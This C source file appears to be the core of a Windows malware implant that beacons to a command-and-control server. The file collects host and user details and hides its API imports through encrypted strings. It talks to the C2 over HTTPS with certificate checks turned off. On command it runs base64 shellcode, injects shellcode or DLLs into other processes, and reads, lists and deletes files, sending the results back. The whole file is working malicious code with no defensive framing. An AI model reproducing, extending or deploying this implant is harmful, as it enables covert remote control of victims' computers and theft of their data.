// platform specific headers needed so we can function

#define WIN32_LEAN_AND_MEAN

#include <windows.h>

#include <lm.h>
#include <winhttp.h>
#include <stdio.h>
#include <versionhelpers.h>

// so we can parse the json data

#include "../lib/json-c/json.h"

// local

#include "base64.h"
#include "imports.h"
#include "strings.h"
#include "compression.h"

// core header file

#include "core.h"

// include settings for callbacks

#include "settings.h"

// Include stdlib function prototypes
#include "../lib/stdlib/stdlib.h"

// core functions
BOOL GetBasicUserInfo(struct BasicUserInfo *UserInfo)
{

    /* get basic infomation about how the current user is running */

    DWORD dwUserBuf = 256;
    char chCurrentUser[256];
    LPSTR DomainBuf[MAX_PATH], ComputerBuf[MAX_PATH];
    DWORD bufSize2, bufSize3 = UNLEN+1;

    // set username

    GetUserName(chCurrentUser, &dwUserBuf);
    UserInfo->UserName = chCurrentUser;

    // set the domain

    ZeroMemory(DomainBuf, MAX_PATH);
    GetComputerNameEx( ComputerNameDnsDomain, DomainBuf, &bufSize2 );
    UserInfo->DomainName = DomainBuf;

    if (strlen(UserInfo->DomainName) == 0)
    {
        UserInfo->DomainName = "NULL";
    }

    // set the computer name

    GetComputerNameA( ComputerBuf, &bufSize3 );
    UserInfo->ComputerName = ComputerBuf;

    return TRUE;
}

BOOL GetBasicCompInfo(struct BasicCompInfo *CompInfo)
{
    OSVERSIONINFOEXW osInfo;
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

    RtlGetVersion_ RtlGetVersion = (RtlGetVersion_)GetProcAddress(LoadLibrary("ntdll.dll"), "RtlGetVersion");

    RtlGetVersion(&osInfo);

    if (sizeof(void*) == 8)
        CompInfo->Arch = "x64";
    if (sizeof(void*) == 4)
        CompInfo->Arch = "x86";

    #ifdef SECURE
        CompInfo->Secure = "SECURE";
    #endif

    #ifndef SECURE
        CompInfo->Secure = "INSECURE";
    #endif

    if ((osInfo.dwMajorVersion == 10) && (osInfo.wProductType == VER_NT_WORKSTATION))
    {
        CompInfo->OS = "Windows 10";
        return;
    }
    if ((osInfo.dwMajorVersion == 10) && (osInfo.wProductType != VER_NT_WORKSTATION))
    {
        if (IsWindowsVersionOrGreater(osInfo.dwMajorVersion, 0, 1803))
        {
            CompInfo->OS = "Windows Server 2019";
            return;
        } else {
            CompInfo->OS = "Windows Server 2016";
            return;
        }
    }
    if ((osInfo.dwMajorVersion == 6) && (osInfo.dwMinorVersion == 3) && (osInfo.wProductType == VER_NT_WORKSTATION))
    {
        CompInfo->OS = "Windows 8.1";
        return;
    }
    if ((osInfo.dwMajorVersion == 6) && (osInfo.dwMinorVersion == 3) && (osInfo.wProductType != VER_NT_WORKSTATION))
    {
        CompInfo->OS = "Windows Server 2012 R2";
        return;
    }
    if ((osInfo.dwMajorVersion == 6) && (osInfo.dwMinorVersion == 2) && (osInfo.wProductType == VER_NT_WORKSTATION))
    {
        CompInfo->OS = "Windows 8";
        return;
    }
    if ((osInfo.dwMajorVersion == 6) && (osInfo.dwMinorVersion == 2) && (osInfo.wProductType != VER_NT_WORKSTATION))
    {
        CompInfo->OS = "Windows Server 2012";
        return;
    }

    CompInfo->OS = "Windows";

}

LPVOID DieCleanly()
{
    // not much to say bout this lol
    exit(1);
}

BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent, LPCWSTR UriBuffer, DWORD dwSize)
{

    /* callback and register this beacon with the C2 */

    // init some important variables

    BOOL                bResults = FALSE;
    DWORD               flags;
    CHAR                ReadBuffer[dwSize + 1];
    DWORD               dwDownloaded = 0;
    HINTERNET           hSession = NULL, hConnect = NULL, hRequest = NULL;
    HMODULE             hWinHTTPdll;
    char*               tmp_decrypted_str;
    struct json_object *parsed_json;

    // create all references to dll functions
    // Load WinHTTP.dll
    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY);
    hWinHTTPdll = LoadLibrary(tmp_decrypted_str);
    free(tmp_decrypted_str);

    // Create WinHttpCloseHandle reference
    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_CLOSEH, STRING_WINHTTP_CLOSEH_KEY);
    WinHttpCloseHandle_ rWinHttpCloseHandle = (WinHttpCloseHandle_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
    free(tmp_decrypted_str);

    // Create WinHttpOpen reference
    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_OPEN, STRING_WINHTTP_OPEN_KEY);
    WinHttpOpen_ rWinHttpOpen = (WinHttpOpen_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
    free(tmp_decrypted_str);

    // Create WinHttpConnect reference
    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_CONNECT, STRING_WINHTTP_CONNECT_KEY);
    WinHttpConnect_ rWinHttpConnect = (WinHttpConnect_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
    free(tmp_decrypted_str);

    // Create WinHttpOpenRequest reference
    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_OPENREQ, STRING_WINHTTP_OPENREQ_KEY);
    WinHttpOpenRequest_ rWinHttpOpenRequest = (WinHttpOpenRequest_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
    free(tmp_decrypted_str);

    // Create WinHttpSetOption reference
    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_SETOPT, STRING_WINHTTP_SETOPT_KEY);
    WinHttpSetOption_ rWinHttpSetOption = (WinHttpSetOption_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
    free(tmp_decrypted_str);

    // Create WinHttpSendRequest reference
    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_SENDREQ, STRING_WINHTTP_SENDREQ_KEY);
    WinHttpSendRequest_ rWinHttpSendRequest = (WinHttpSendRequest_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
    free(tmp_decrypted_str);

    // Create WinHttpReceiveResponse reference
    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_RECVRES, STRING_WINHTTP_RECVRES_KEY);
    WinHttpReceiveResponse_ rWinHttpReceiveResponse = (WinHttpReceiveResponse_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
    free(tmp_decrypted_str);

    // Create WinHttpQueryDataAvailable reference
    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_DATAAVA, STRING_WINHTTP_DATAAVA_KEY);
    WinHttpQueryDataAvailable_ rWinHttpQueryDataAvailable = (WinHttpQueryDataAvailable_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
    free(tmp_decrypted_str);

    // Create WinHttpReadData reference
    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_READATA, STRING_WINHTTP_READATA_KEY);
    WinHttpReadData_ rWinHttpReadData = (WinHttpReadData_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
    free(tmp_decrypted_str);

    // init the connection
    hSession = rWinHttpOpen((LPCWSTR)UserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession)
    {
        // not really alot we can do about this, guess we just return and try again later...
        DEBUG("FAILED: WinHttpOpen, GetLastError(): %d", GetLastError());
        return FALSE;
    }

    // do the connection
    hConnect = rWinHttpConnect(hSession, (LPCWSTR)CallbackAddress, CallbackPort, 0);

    if (!hConnect)
    {
        rWinHttpCloseHandle(hSession);

        DEBUG("FAILED: WinHttpConnect, GetLastError(): %d", GetLastError());

        return FALSE;
    }

    // set up the request

    hRequest = rWinHttpOpenRequest(hConnect, L"POST", _REGISTER_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);

    if (!hRequest)
    {
        rWinHttpCloseHandle(hSession);
        rWinHttpCloseHandle(hConnect);

        DEBUG("FAILED: WinHttpOpenRequest, GetLastError(): %d", GetLastError());

        return FALSE;
    }

    // set the flags for our request, basically so we can connect when the c2 ssl cert is fucked
    flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

    if (!rWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
    {
        rWinHttpCloseHandle(hRequest);
        rWinHttpCloseHandle(hSession);
        rWinHttpCloseHandle(hConnect);

        DEBUG("FAILED: WinHttpSetOption, GetLastError(): %d", GetLastError());

        return FALSE;
    }

    // finally send the actual request to the c2

    bResults = rWinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)UriBuffer, strlen((char*)UriBuffer), strlen((char*)UriBuffer), 0);

    // make sure the request was successful
    if (bResults)
    {
        bResults = rWinHttpReceiveResponse(hRequest, NULL);
    } else {
        if (GetLastError() & ERROR_WINHTTP_SECURE_FAILURE)
        {
            DEBUG("FAILED: WinHttpSendRequest (ERROR_WINHTTP_SECURE_FAILURE)");
        }

        DEBUG("FAILED: WinHttpSendRequest, GetLastError(): %d", GetLastError());
    }

    // no lets get the session id
    if (bResults)
    {
        do
        {
            if (!rWinHttpQueryDataAvailable( hRequest, &dwSize))
            {
                // Theres no data avalible
                DEBUG("FAILED: WinHttpQueryDataAvailable, GetLastError(): %d", GetLastError());
                return FALSE;
            }

            if (!rWinHttpReadData( hRequest, (LPVOID)ReadBuffer, dwSize, &dwDownloaded))
            {
                // been an error
                DEBUG("FAILED: WinHttpReadData, GetLastError(): %d", GetLastError());
                return FALSE;
            }

        } while (dwSize > 0);

    }

    // clean up the request stuffs now we are done with it.
    rWinHttpCloseHandle(hRequest);
    rWinHttpCloseHandle(hSession);
    rWinHttpCloseHandle(hConnect);

    // now its time to parse the json data in the responce
    parsed_json = json_tokener_parse(ReadBuffer);

    // get the id and store it in the idbuffer
    parsed_json = json_object_object_get(parsed_json, "id");
    strcpy(IdBuffer, json_object_get_string(parsed_json));

    // Decrement json object reference count
    json_object_put(parsed_json);
    // Free WinHTTP.dll
    FreeLibrary(hWinHTTPdll);
    return TRUE;
}

LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
{
    /*
    Build the reply to the C2 containing any data we need to send back
    */
    LPCSTR *beaconCheckinData;
    struct json_object *jobj;

    // init the json object
    jobj = json_object_new_object();

    // create the id buffer
    json_object_object_add(jobj, "id", json_object_new_string(IdBuffer));

    // add the correct data to the json data
    switch (Mode)
    {
    case MODE_CHECKIN_NO_DATA:

        // dont add any data
        break;

    case MODE_CHECKIN_DATA:

        // add the opcode and data to the json data
        json_object_object_add(jobj, "opcode", json_object_new_int64(OpCode));
        json_object_object_add(jobj, "data", json_object_new_string(Data));

        break;

    default:
        break;
    }

    // return the formated data
    beaconCheckinData = (LPCSTR *) _strdup(json_object_to_json_string_ext(jobj, JSON_C_TO_STRING_PLAIN));
    json_object_put(jobj);
    return beaconCheckinData;
}

LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent, DWORD *OpCode, LPCSTR SendBuffer, DWORD SendOpCode, DWORD SendBufferSize)
{
    /* callback to the c2 and check for a task or deliver data*/

    // init some important variables for are callback

    LPCWSTR*            ResBuffer;
    BOOL                bResults = FALSE;
    DWORD               dwAvailableBytesToRead = 0;
    HINTERNET           hSession = NULL, hConnect = NULL, hRequest = NULL;
    LPCSTR*             UriBuffer;
    DWORD               flags;
    HMODULE             hWinHTTPdll;
    char*               tmp_decrypted_str;

    struct json_object *parsed_json;
    struct json_object *parsed_json_task;
    struct json_object *parsed_json_args;


    // create all references to dll functions
    // Load WinHTTP.dll
    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY);
    hWinHTTPdll = LoadLibrary(tmp_decrypted_str);
    free(tmp_decrypted_str);

    // Create WinHttpCloseHandle reference
    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_CLOSEH, STRING_WINHTTP_CLOSEH_KEY);
    WinHttpCloseHandle_ rWinHttpCloseHandle = (WinHttpCloseHandle_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
    free(tmp_decrypted_str);

    // Create WinHttpOpen reference
    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_OPEN, STRING_WINHTTP_OPEN_KEY);
    WinHttpOpen_ rWinHttpOpen = (WinHttpOpen_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
    free(tmp_decrypted_str);

    // Create WinHttpConnect reference
    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_CONNECT, STRING_WINHTTP_CONNECT_KEY);
    WinHttpConnect_ rWinHttpConnect = (WinHttpConnect_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
    free(tmp_decrypted_str);

    // Create WinHttpOpenRequest reference
    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_OPENREQ, STRING_WINHTTP_OPENREQ_KEY);
    WinHttpOpenRequest_ rWinHttpOpenRequest = (WinHttpOpenRequest_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
    free(tmp_decrypted_str);

    // Create WinHttpSetOption reference
    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_SETOPT, STRING_WINHTTP_SETOPT_KEY);
    WinHttpSetOption_ rWinHttpSetOption = (WinHttpSetOption_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
    free(tmp_decrypted_str);

    // Create WinHttpSendRequest reference
    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_SENDREQ, STRING_WINHTTP_SENDREQ_KEY);
    WinHttpSendRequest_ rWinHttpSendRequest = (WinHttpSendRequest_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
    free(tmp_decrypted_str);

    // Create WinHttpReceiveResponse reference
    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_RECVRES, STRING_WINHTTP_RECVRES_KEY);
    WinHttpReceiveResponse_ rWinHttpReceiveResponse = (WinHttpReceiveResponse_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
    free(tmp_decrypted_str);

    // Create WinHttpQueryDataAvailable reference
    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_DATAAVA, STRING_WINHTTP_DATAAVA_KEY);
    WinHttpQueryDataAvailable_ rWinHttpQueryDataAvailable = (WinHttpQueryDataAvailable_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
    free(tmp_decrypted_str);

    // Create WinHttpReadData reference
    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_READATA, STRING_WINHTTP_READATA_KEY);
    WinHttpReadData_ rWinHttpReadData = (WinHttpReadData_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
    free(tmp_decrypted_str);

    hSession = rWinHttpOpen((LPCWSTR)UserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession)
    {
        // not really alot we can do about this, guess we just return and try again later...
        return FALSE;
    }

    // do the connection
    hConnect = rWinHttpConnect(hSession, (LPCWSTR)CallbackAddress, CallbackPort, 0);

    if (!hConnect)
    {
        rWinHttpCloseHandle(hSession);

        return FALSE;
    }

    // set up the request

    hRequest = rWinHttpOpenRequest(hConnect, L"POST", _CALLBACK_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);

    if (!hRequest)
    {
        rWinHttpCloseHandle(hSession);
        rWinHttpCloseHandle(hConnect);

        return FALSE;
    }

    // set the flags for our request, basically so we can connect when the c2 ssl cert is fucked

    flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

    if (!rWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
    {
        rWinHttpCloseHandle(hRequest);
        rWinHttpCloseHandle(hSession);
        rWinHttpCloseHandle(hConnect);

        return FALSE;
    }

    // build the data for the request

    if (SendOpCode != NULL)
    {
        UriBuffer = BuildCheckinData(SendOpCode, SendBuffer, MODE_CHECKIN_DATA);
    } else {
        UriBuffer = BuildCheckinData(NULL, NULL, MODE_CHECKIN_NO_DATA);
    }

    // finally send the actual request to the c2

    bResults = rWinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)UriBuffer, strlen((char*)UriBuffer), strlen((char*)UriBuffer), 0);
    free(UriBuffer);

    // make sure the request was successful

    if (bResults)
    {
        bResults = rWinHttpReceiveResponse(hRequest, NULL);
    }

    if (bResults)
    {
        DWORD dwSize = 0;
        DWORD dwDownloaded = 0;
        LPSTR pszOutBuffer;

        ResBuffer = "";
        char* tmp;

        do
        {

            // check how much available data there is

            dwSize = 0;

            if (!rWinHttpQueryDataAvailable( hRequest, &dwSize))
            {
                DEBUG( "Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
                break;
            }

            // out of data

            if (!dwSize)
            {
                break;
            }

            // allocate space for the buffer

            pszOutBuffer = (LPSTR)malloc(dwSize+1);

            if (!pszOutBuffer)
            {
                DEBUG("Out of memory\n");
                break;
            }

            // read all the data

            ZeroMemory(pszOutBuffer, dwSize + 1);

            if (!rWinHttpReadData( hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
            {
                // been an error
                return FALSE;
            }
            else
            {
                // TODO: test if this is leaking memory.
                asprintf(&ResBuffer, "%s%s", ResBuffer, pszOutBuffer);
            }

            // free the memory allocated to the buffer.

            free(pszOutBuffer);

        } while (dwSize > 0);
    }

    // get the opcode
    parsed_json = json_tokener_parse(ResBuffer);
    parsed_json_task = json_object_object_get(parsed_json, "task");
    *OpCode     = json_object_get_int(parsed_json_task);

    parsed_json_args = json_object_object_get(parsed_json, "args");
    LPCSTR *argsBuffer = NULL;
    if (parsed_json != NULL)
    {
        // Copy args json string into return buffer
        argsBuffer = (LPCSTR *) _strdup(json_object_get_string(parsed_json_args));
    }
    // Free ResBuffer json object
    json_object_put(parsed_json);
    // Cleanup handles
    rWinHttpCloseHandle(hRequest);
    rWinHttpCloseHandle(hSession);
    rWinHttpCloseHandle(hConnect);
    return argsBuffer;
}

BOOL SpawnExecuteCode(char* Base64Buffer)
{
    size_t out_len   = strlen(Base64Buffer) + 1;
    size_t b64_len   = b64_decoded_size(Base64Buffer);
    char*  b64_out   = (char*)malloc(out_len);

    b64_out = base64_decode((const char*)Base64Buffer, out_len - 1, &out_len);

    return SpawnCode(b64_out, b64_len);
}

BOOL InjectExecuteCode(char* Buffer)
{
    struct json_object *parsed_json;

    // get pid to inject into
    parsed_json = json_tokener_parse(Buffer);
    parsed_json = json_object_object_get(parsed_json, "pid");
    int pid = json_object_get_int(parsed_json);

    // get the base64 data to inject
    parsed_json = json_tokener_parse(Buffer);
    parsed_json = json_object_object_get(parsed_json, "data");
    char* data = json_object_get_string(parsed_json);

    // decode that base64 data
    size_t out_len   = strlen(data) + 1;
    size_t b64_len   = b64_decoded_size(data);
    char*  b64_out   = (char*)malloc(out_len);

    b64_out = base64_decode((const char*)data, out_len - 1, &out_len);

    // inject the code
    return InjectCode(b64_out, b64_len, pid);
}

BOOL InjectExecuteDll(char* Buffer)
{
    struct json_object *parsed_json;

    // get pid to inject into
    parsed_json = json_tokener_parse(Buffer);
    parsed_json = json_object_object_get(parsed_json, "pid");
    int pid = json_object_get_int(parsed_json);

    // get the base64 dll to inject
    parsed_json = json_tokener_parse(Buffer);
    parsed_json = json_object_object_get(parsed_json, "dll");
    char* data = json_object_get_string(parsed_json);

    // decode that base64 dll
    size_t out_len   = strlen(data) + 1;
    size_t b64_len   = b64_decoded_size(data);
    char*  b64_out   = (char*)malloc(out_len);

    b64_out = base64_decode((const char*)data, out_len - 1, &out_len);

    // inject the code
    return InjectDLL(b64_out, b64_len, pid);
}

BOOL Stdlib(char* Buffer)
{
    char* data = NULL;
    DWORD rOpCode;
    struct json_object *parsed_json;

    parsed_json = json_tokener_parse(Buffer);
    parsed_json = json_object_object_get(parsed_json, "op");
    int op = json_object_get_int(parsed_json);

    parsed_json = json_tokener_parse(Buffer);
    parsed_json = json_object_object_get(parsed_json, "args");
    char* args = json_object_get_string(parsed_json);

    switch (op)
    {

    case 0x1000:
        data = listdirs(args);
        break;

    case 0x2000:
        data = readfile(args);
        break;

    case 0x3000:
        data = getdir();
        break;

    case 0x4000:
        data = removefile(args);
        break;

    case 0x5000:
        data = makedirectory(args);
        break;

    case 0x6000:
        data = changedir(args);
        break;

    case 0x7000:
        data = getpid();
        break;

    case 0x8000:
        data = getps();
        break;
    }

    if (data != NULL)
    {
        BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, &rOpCode, data, DO_CALLBACK, strlen(data));
    }

    return TRUE;
}

LPVOID ReportExecutionFail()
{
    return;
}